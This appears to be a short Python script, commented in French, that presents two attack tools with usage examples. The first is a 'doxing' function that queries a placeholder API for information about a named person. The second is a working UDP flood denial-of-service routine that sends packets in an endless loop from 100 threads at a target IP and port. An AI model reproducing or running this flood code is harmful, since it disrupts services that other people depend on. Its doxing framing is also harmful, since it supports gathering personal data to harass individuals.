# Doxing
import requests

def dox_person(name):
    # Simuler une recherche d'informations sur une personne
    response = requests.get(f"https://api.example.com/dox?name={name}")
    return response.json()

# Exemple d'utilisation
info = dox_person("John Doe")
print(info)

# DDOS
import socket
import threading

def ddos_attack(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = b'\x00' * 1024
    while True:
        sock.sendto(bytes, (target_ip, target_port))

# Exemple d'utilisation
target_ip = "192.168.1.1"
target_port = 80
for i in range(100):
    thread = threading.Thread(target=ddos_attack, args=(target_ip, target_port))
    thread.start()
